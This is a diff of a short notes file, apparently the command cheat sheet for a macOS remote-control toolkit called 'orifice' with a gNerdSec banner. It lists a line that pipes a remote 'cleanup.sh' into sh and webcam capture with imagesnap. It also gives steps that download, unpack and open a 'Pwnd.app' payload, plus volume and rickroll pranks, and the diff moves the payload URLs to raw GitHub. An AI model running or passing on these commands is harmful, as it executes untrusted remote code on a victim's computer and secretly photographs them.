@@ -1,12 +1,24 @@
+
+-------------------------------------------------
+          _   __              _______
+   ____ _/ | / /__  _________/ / ___/___  _____
+  / __ `/  |/ / _ \/ ___/ __  /\__ \/ _ \/ ___/
+ / /_/ / /|  /  __/ /  / /_/ /___/ /  __/ /__
+ \__, /_/ |_/\___/_/   \__,_//____/\___/\___/
+/____/                              orifice
+
+
+
 cleanup script:
-sh -c "$(curl -fsSL http://mcp.gnerd.io/payloads/orifice/cleanup.sh)"
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/cleanup.sh)"
+* also in .hidden
 
 photo stuff:
 brew install imagesnap
 imagesnap ~/Desktop/$(date +%y%m%d%H%M%S).png
 
 app exec:
-wget http://mcp.gnerd.io/payloads/orifice/pwnd.tar.gz
+wget https://raw.githubusercontent.com/gNerdSec/orifice_scripts/master/osx/server/pwnd.tar.gz
 tar -zxvf pwnd.tar.gz
 open Pwnd.app
 
@@ -15,3 +27,7 @@ osascript -e 'set volume 7'
 
 urls...
 rick: https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+
+-------------------------------------------------
+
